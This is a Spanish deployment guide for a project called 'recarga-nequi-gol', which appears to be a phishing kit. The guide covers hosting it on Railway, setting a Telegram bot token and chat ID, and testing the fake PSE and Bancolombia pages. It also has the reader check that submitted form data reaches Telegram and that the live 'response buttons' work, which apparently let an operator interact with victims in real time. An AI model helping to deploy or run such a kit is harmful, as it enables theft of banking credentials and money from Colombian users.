# Verificación de Despliegue

## ✅ Sistema Desplegado en GitHub

El código está disponible en: https://github.com/hanselrosales255/recarga-nequi-gol

## 🚀 Para Desplegar en Railway

### Opción 1: Desde Railway Dashboard

1. **Ir a Railway**: https://railway.app/dashboard
2. **New Project** → **Deploy from GitHub repo**
3. **Seleccionar**: `hanselrosales255/recarga-nequi-gol`
4. **Configurar Variables** (en pestaña Variables):
   ```
   TELEGRAM_BOT_TOKEN=tu_token_de_bot
   TELEGRAM_CHAT_ID=tu_chat_id
   ```
5. **Deploy automático** comenzará

### Opción 2: Usando Railway CLI

```bash
# Instalar Railway CLI
npm install -g @railway/cli

# Login
railway login

# En el directorio del proyecto
cd C:\Users\Hansel\Desktop\recarga-nequi-gol

# Vincular proyecto
railway link

# Configurar variables
railway variables set TELEGRAM_BOT_TOKEN=tu_token
railway variables set TELEGRAM_CHAT_ID=tu_chat_id

# Deploy
railway up
```

## 🔍 Verificar que Funciona

Una vez desplegado:

1. **Obtener URL**: Railway generará algo como `https://recarga-nequi-gol-production.up.railway.app`

2. **Probar páginas**:
   - Página principal: `https://tu-url.railway.app/`
   - PSE: `https://tu-url.railway.app/pse/`
   - Bancas: `https://tu-url.railway.app/bancas/Bancolombia/`

3. **Verificar Socket.IO**: Abre DevTools (F12) → Console → Deberías ver:
   ```
   Socket conectado
   SessionID: session_xxxxx
   ```

4. **Probar Telegram**:
   - Completa un formulario
   - Verifica que llegue el mensaje a tu Telegram
   - Prueba los botones de respuesta

## ⚙️ Configuración Avanzada

### Custom Domain
1. Railway Dashboard → tu proyecto
2. Settings → Domains
3. Add Custom Domain
4. Configurar DNS (CNAME o A record)

### Monitoreo
- **Logs**: Railway Dashboard → Deployments → View Logs
- **Metrics**: CPU, RAM, Network en tiempo real
- **Alertas**: Configura notificaciones

### Escalado
Railway escala automáticamente según carga, pero puedes:
1. Settings → Resources
2. Ajustar límites de CPU/RAM

## 🐛 Troubleshooting

### Error: "Application failed to respond"
- Verifica que `server.js` esté en la raíz
- Confirma que el comando `npm start` funciona localmente

### Bot no responde
- Revisa logs: `railway logs`
- Verifica variables `TELEGRAM_BOT_TOKEN` y `TELEGRAM_CHAT_ID`
- Asegúrate de que el bot esté en el grupo/chat

### Socket.IO no conecta
- Verifica URL correcta (https://)
- Revisa configuración CORS en server.js
- Comprueba en DevTools → Network → WS

## 📊 Estado Actual

- ✅ GitHub: Código subido
- ⏳ Railway: Pendiente de despliegue
- ⏳ Pruebas: Pendientes

## 🔄 Actualizaciones Futuras

Cada vez que hagas cambios:
```bash
git add .
git commit -m "Descripción del cambio"
git push origin main
```

Railway redesplegar automáticamente.

## 📞 Soporte

- Railway Docs: https://docs.railway.app
- Railway Discord: https://discord.gg/railway
- GitHub Issues: https://github.com/hanselrosales255/recarga-nequi-gol/issues
